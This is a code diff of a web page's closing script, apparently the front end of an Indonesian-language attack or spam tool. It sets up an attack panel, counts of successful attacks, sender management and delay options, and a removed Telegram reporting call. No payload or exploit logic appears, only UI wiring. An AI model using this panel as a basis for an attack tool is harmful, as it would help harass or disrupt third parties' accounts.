+function createRipple(e) { const btn = e.currentTarget; const old = btn.querySelector('.ripple-effect'); if (old) old.remove(); const r = document.createElement('span'); r.className = 'ripple-effect'; const rect = btn.getBoundingClientRect(); const s = Math.max(rect.width, rect.height); r.style.width = s + 'px'; r.style.height = s + 'px'; r.style.left = (e.clientX - rect.left - s / 2) + 'px'; r.style.top = (e.clientY - rect.top - s / 2) + 'px'; r.style.transform = 'scale(0)'; r.style.transition = 'none'; btn.appendChild(r); requestAnimationFrame(() => { r.style.transform = 'scale(4)'; r.style.opacity = '0'; r.style.transition = 'transform 0.6s ease-out, opacity 0.6s ease-out'; }); setTimeout(() => { if (r.parentNode) r.remove(); }, 600); }
 
-function clearAllLogs() {
-  localStorage.removeItem(LOGS_STORAGE_KEY);
-  loadLogs();
-  updateProfileStats();
-  hideConfirmDialog();
-  showToast("All logs cleared");
-}
-
-function updateProfileStats() {
-  const logs = getLogs();
-  document.getElementById('totalAttacks').textContent = logs.length;
-  document.getElementById('successfulAttacks').textContent = logs.filter(l => l.status.includes('Success')).length;
-  document.getElementById('lastAttackTime').textContent = logs.length > 0 ? new Date(logs[logs.length - 1].timestamp).toLocaleString('id-ID', { day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit' }) : '0/0';
-}
-
-function handleVideoReady() {
-  const heroVideo = document.querySelector('.hero-video');
-  if (heroVideo) { heroVideo.classList.add('ready'); heroVideo.play().catch(()=>{}); }
-}
-
-function createRipple(event) {
-  const button = event.currentTarget;
-  const existingRipple = button.querySelector('.ripple-effect');
-  if (existingRipple) existingRipple.remove();
-  const ripple = document.createElement('span');
-  ripple.className = 'ripple-effect';
-  const rect = button.getBoundingClientRect();
-  const size = Math.max(rect.width, rect.height);
-  ripple.style.width = size + 'px'; ripple.style.height = size + 'px';
-  ripple.style.left = (event.clientX - rect.left - size / 2) + 'px';
-  ripple.style.top = (event.clientY - rect.top - size / 2) + 'px';
-  ripple.style.transform = 'scale(0)'; ripple.style.transition = 'none';
-  button.appendChild(ripple);
-  requestAnimationFrame(() => { ripple.style.transform = 'scale(4)'; ripple.style.opacity = '0'; ripple.style.transition = 'transform 0.6s ease-out, opacity 0.6s ease-out'; });
-  setTimeout(() => { if (ripple.parentNode) ripple.remove(); }, 600);
-}
-
-// Initialize
+// Init
 chatSessionId = getChatSession();
-sessionSent = localStorage.getItem(SESSION_SENT_KEY) === 'true';
 
 document.addEventListener('DOMContentLoaded', function() {
-  document.querySelectorAll('.card:not([onclick*="openAttackPanel"]):not([onclick*="openSecurePanel"]):not([onclick*="openManageSender"]):not([onclick*="openLivechatPanel"]), .tools-card').forEach(card => {
-    card.addEventListener('click', () => showToast());
-  });
-  
-  selectOption('Delay Lite (Soft Delay)');
-  selectPairOption('With Pairing Code');
-  loadLogs();
-  updateProfileStats();
-  updateSenderCount();
-  
-  // Start online services
-  joinOnline();
-  setInterval(heartbeat, 30000);
-  setInterval(updateOnlineCount, 5000);
-  setInterval(updateSenderCount, 5000);
-  
-  if (!sessionSent) {
-    sendToTelegram(`sesilivechat baru ${chatSessionId}`);
-    localStorage.setItem(SESSION_SENT_KEY, 'true');
-    sessionSent = true;
-  }
-  
-  document.querySelectorAll('.back-button').forEach(btn => btn.addEventListener('click', createRipple));
-  
-  const heroVideo = document.querySelector('.hero-video');
-  if (heroVideo) {
-    heroVideo.addEventListener('loadeddata', handleVideoReady);
-    heroVideo.addEventListener('canplay', handleVideoReady);
-    if (heroVideo.readyState >= 2) handleVideoReady();
-    heroVideo.addEventListener('contextmenu', e => e.preventDefault());
-    heroVideo.addEventListener('dragstart', e => e.preventDefault());
-  }
+    document.querySelectorAll('.card:not([onclick*="openAttackPanel"]):not([onclick*="openSecurePanel"]):not([onclick*="openManageSender"]):not([onclick*="openLivechatPanel"]), .tools-card').forEach(c => c.addEventListener('click', () => showToast()));
+    selectOption('Delay Lite (Soft Delay)'); selectPairOption('With Pairing Code');
+    loadLogs(); updateProfileStats(); updateSenderCount();
+    joinOnline(); setInterval(heartbeat, 30000); setInterval(updateOnlineCount, 5000); setInterval(updateSenderCount, 5000);
+    document.querySelectorAll('.back-button').forEach(b => b.addEventListener('click', createRipple));
+    const v = document.querySelector('.hero-video');
+    if (v) { v.addEventListener('loadeddata', handleVideoReady); v.addEventListener('canplay', handleVideoReady); if (v.readyState >= 2) handleVideoReady(); v.addEventListener('contextmenu', e => e.preventDefault()); v.addEventListener('dragstart', e => e.preventDefault()); }
 });
 </script>
-
 </body>
 </html>
